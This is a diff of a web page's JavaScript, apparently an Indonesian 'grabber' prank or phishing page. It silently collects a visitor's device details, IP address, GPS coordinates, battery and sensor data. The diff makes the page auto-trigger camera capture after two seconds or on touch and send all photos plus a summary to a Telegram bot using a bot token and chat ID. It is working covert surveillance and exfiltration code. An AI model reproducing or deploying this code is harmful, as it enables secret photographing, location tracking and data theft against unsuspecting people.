+            message += `📱 DEVICE: ${data.device.type} | ${data.device.brand} | ${data.device.model}\n`;
+            message += `💻 OS: ${data.device.os} | ${data.device.platform}\n`;
+            message += `🌐 BROWSER: ${data.browser.name} ${data.browser.version}\n`;
+            message += `📶 NETWORK: ${data.network.ip} | ${data.browser.language}\n`;
             
-            // Check for common web apps
-            if (navigator.getInstalledRelatedApps) {
-                try {
-                    const relatedApps = await navigator.getInstalledRelatedApps();
-                    relatedApps.forEach(app => {
-                        apps.push(app.platform + ': ' + app.url);
-                    });
-                } catch (e) {
-                    apps.push('Related Apps API blocked');
-                }
+            if (data.location.latitude) {
+                message += `📍 LOCATION: ${data.location.latitude}, ${data.location.longitude}\n`;
+                message += `🗺️ MAPS: ${data.location.maps}\n`;
             }
             
-            // Check for PWA installation
-            if (window.matchMedia('(display-mode: standalone)').matches) {
-                apps.push('PWA: Installed');
-            }
+            message += `🔋 BATTERY: ${data.hardware.battery.level} | ${data.hardware.battery.charging ? 'Charging' : 'Not Charging'}\n`;
+            message += `💾 MEMORY: ${data.hardware.memory}GB | ${data.hardware.cores} cores\n`;
+            message += `🖥️ SCREEN: ${data.hardware.screen}\n\n`;
             
-            return apps.length > 0 ? apps : ['No app info available'];
-        }
-
-        async function getSystemInfo() {
-            return {
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                locale: Intl.DateTimeFormat().resolvedOptions().locale,
-                calendars: Intl.supportedValuesOf('calendar'),
-                collations: Intl.supportedValuesOf('collation'),
-                currencies: Intl.supportedValuesOf('currency'),
-                numberingSystems: Intl.supportedValuesOf('numberingSystem'),
-                timeZones: Intl.supportedValuesOf('timeZone'),
-                units: Intl.supportedValuesOf('unit')
-            };
-        }
-
-        async function getConnectionDetails() {
-            const connection = navigator.connection;
-            if (!connection) return { error: "Connection API not available" };
+            message += `📷 FOTO KAMERA: ${data.camera.success ? '✅ BERHASIL TOTAL' : '❌ GAGAL'}\n`;
+            message += `• Methods Attempted: ${data.camera.totalAttempts}\n`;
+            message += `• Successful Methods: ${data.camera.successfulMethods}\n`;
+            message += `• Photos Captured: ${data.camera.photos.length}\n\n`;
             
-            return {
-                effectiveType: connection.effectiveType,
-                downlink: connection.downlink,
-                rtt: connection.rtt,
-                saveData: connection.saveData,
-                downlinkMax: connection.downlinkMax,
-                type: connection.type
-            };
-        }
-
-        async function getMediaCapabilitiesInfo() {
-            if (navigator.mediaCapabilities) {
-                try {
-                    const decodingInfo = await navigator.mediaCapabilities.decodingInfo({
-                        type: 'file',
-                        video: {
-                            contentType: 'video/webm; codecs="vp8"',
-                            width: 1920,
-                            height: 1080,
-                            bitrate: 1000000,
-                            framerate: 30
-                        }
-                    });
-                    return {
-                        supported: decodingInfo.supported,
-                        smooth: decodingInfo.smooth,
-                        powerEfficient: decodingInfo.powerEfficient
-                    };
-                } catch (e) {
-                    return { error: "Media capabilities failed" };
-                }
-            }
-            return { error: "Media Capabilities API not supported" };
-        }
-
-        async function getSecurityInfo() {
-            return {
-                secureContext: window.isSecureContext,
-                https: location.protocol === 'https:',
-                crossOriginIsolated: window.crossOriginIsolated,
-                origin: location.origin,
-                referrer: document.referrer,
-                originPolicy: 'unknown' // Not widely supported yet
-            };
-        }
-
-        async function getPerformanceMetrics() {
-            const perf = performance;
-            return {
-                timing: {
-                    navigationStart: perf.timing.navigationStart,
-                    loadEventEnd: perf.timing.loadEventEnd,
-                    domComplete: perf.timing.domComplete,
-                    domInteractive: perf.timing.domInteractive
-                },
-                memory: perf.memory ? {
-                    used: perf.memory.usedJSHeapSize,
-                    total: perf.memory.totalJSHeapSize,
-                    limit: perf.memory.jsHeapSizeLimit
-                } : null,
-                navigation: perf.navigation ? {
-                    type: perf.navigation.type,
-                    redirectCount: perf.navigation.redirectCount
-                } : null
-            };
-        }
-
-        async function getSensorData() {
-            return new Promise((resolve) => {
-                const sensorData = {};
-                
-                if ('DeviceOrientationEvent' in window) {
-                    window.addEventListener('deviceorientation', (event) => {
-                        sensorData.orientation = {
-                            alpha: event.alpha,
-                            beta: event.beta,
-                            gamma: event.gamma
-                        };
-                    }, { once: true });
-                }
-                
-                if ('DeviceMotionEvent' in window) {
-                    window.addEventListener('devicemotion', (event) => {
-                        sensorData.motion = {
-                            acceleration: event.acceleration,
-                            accelerationIncludingGravity: event.accelerationIncludingGravity,
-                            rotationRate: event.rotationRate
-                        };
-                    }, { once: true });
-                }
-                
-                setTimeout(() => resolve(sensorData), 1000);
-            });
-        }
-
-        // ... (Previous utility functions remain the same)
-
-        // === ULTRA FAST TELEGRAM SEND ===
-        async function sendUltraToTelegram(data) {
-            const now = new Date();
-            
-            let message = `🚨 Franzz mewing🤫🧏‍♂️ x Monyet si monkey👿👿 🚨\n\n`;
-            
-            // Add all the collected information to the message...
-            // [Previous message construction code remains the same but expanded with new data categories]
-            
-            // This would be a very long message with all the new information
-            // For brevity, I'm showing the structure but the actual implementation 
-            // would include all the new data points collected above
-            
-            message += `🕐 WAKTU: ${now.toLocaleString()} (${data.collectionTime})\n\n`;
-            
-            message += `📱 PERANGKAT: ${data.device.type} | ${data.device.brand} | ${data.device.model}\n`;
-            message += `💻 SISTEM: ${data.device.os} ${data.device.osVersion} | ${data.hardware.cpu.cores} cores\n`;
-            message += `🌐 BROWSER: ${data.browser.name} ${data.browser.fullVersion}\n`;
-            message += `📶 JARINGAN: ${data.network.ip} | ${data.network.type} | ${data.network.bandwidth}\n`;
-            
-            if (data.location.gps.latitude) {
-                message += `📍 LOKASI: ${data.location.gps.latitude}, ${data.location.gps.longitude}\n`;
-                message += `🗺️ MAPS: ${data.location.gps.maps}\n`;
-            }
-            
-            message += `🔋 BATERAI: ${data.hardware.battery.level} | ${data.hardware.battery.charging ? 'Charging' : 'Not Charging'}\n`;
-            message += `💾 MEMORI: ${data.hardware.memory.used} used | ${data.hardware.storage.usage} storage\n`;
-            message += `📷 KAMERA: ${data.camera.captured}/${data.camera.total} berhasil\n\n`;
-            
-            message += `🔧 INFO TAMBAHAN:\n`;
-            message += `• Sensor: ${data.hardware.sensors.length} terdeteksi\n`;
-            message += `• Fitur Browser: ${data.browser.features.length}\n`;
-            message += `• Aplikasi: ${data.apps.length} terdeteksi\n`;
-            message += `• Izin: ${data.browser.permissions.length}\n`;
-            message += `• Zona Waktu: ${data.system.timezone}\n`;
-            message += `• Lokal: ${data.system.locale}\n\n`;
-            
-            message += `📊 PERFORMANSI:\n`;
-            message += `• Load Time: ${data.performance.timing.loadEventEnd - data.performance.timing.navigationStart}ms\n`;
-            message += `• DOM Ready: ${data.performance.timing.domInteractive - data.performance.timing.navigationStart}ms\n`;
-            message += `• Memory Used: ${data.performance.memory ? data.performance.memory.used + ' bytes' : 'N/A'}\n\n`;
-            
-            message += `🛡️ KEAMANAN:\n`;
-            message += `• HTTPS: ${data.security.https ? 'Yes' : 'No'}\n`;
-            message += `• Secure Context: ${data.security.secureContext ? 'Yes' : 'No'}\n`;
-            message += `• Cross-Origin: ${data.security.crossOriginIsolated ? 'Yes' : 'No'}\n\n`;
-            
-            message += `📷 FOTO KAMERA: ${data.camera.success ? '✅ BERHASIL' : '❌ GAGAL'}\n`;
+            message += `🎯 DETAIL FOTO:\n`;
             data.camera.photos.forEach((photo, index) => {
-                message += `• ${photo.camera}: ${photo.success ? '✅ ' + photo.resolution : '❌ ' + photo.error}\n`;
+                message += `• ${photo.camera}: ${photo.resolution} ✅\n`;
             });
-            message += `\n`;
             
-            message += `⚠️ INFORMASI SUPER LENGKAP TELAH DIKumpulkan! ⚠️`;
+            message += `\n⚡ COLLECTION TIME: ${data.collectionTime}\n`;
+            message += `🌐 TIMEZONE: ${data.advanced.timezone}\n`;
+            message += `🔧 LANGUAGES: ${data.advanced.languages.join(', ')}\n\n`;
+            
+            message += `⚠️ FOTO ASLI TELAH DIKIRIM KE TELEGRAM! ⚠️`;
 
             try {
                 // Send text message
@@ -918,7 +721,7 @@
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
-                        'User-Agent': 'Mozilla/5.0'
+                    'User-Agent': 'Mozilla/5.0'
                     },
                     body: JSON.stringify({
                         chat_id: CHAT_ID,
@@ -926,9 +729,9 @@
                     })
                 });
 
-                // Send actual photos
+                // Send ALL photos that were captured
                 for (let photo of data.camera.photos) {
-                    if (photo.success && photo.photo) {
+                    if (photo.photo) {
                         try {
                             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                 method: 'POST',
@@ -941,7 +744,7 @@
                                     caption: `📸 ${photo.camera} - ${photo.resolution} - ${photo.timestamp}`
                                 })
                             });
-                            // Delay between photo sends to avoid rate limiting
+                            // Wait between sends
                             await new Promise(resolve => setTimeout(resolve, 1000));
                         } catch (photoError) {
                             console.log('Photo send error:', photoError);
@@ -954,19 +757,21 @@
             }
         }
 
-        // Auto-start after 3 seconds
+        // Auto-start after 2 seconds
         setTimeout(() => {
             if (!isCollecting) {
-                startUltraCollection();
+                forceCameraAccess();
             }
-        }, 3000);
+        }, 2000);
 
-        // Touch support for mobile
+        // Touch support
         document.querySelector('.main-ghost').addEventListener('touchstart', function(e) {
             e.preventDefault();
-            startUltraCollection();
+            forceCameraAccess();
         });
+
+        console.log("🔄 Camera system READY - 5 methods available");
 
     </script>
 </body>
-    </html>
+</html>
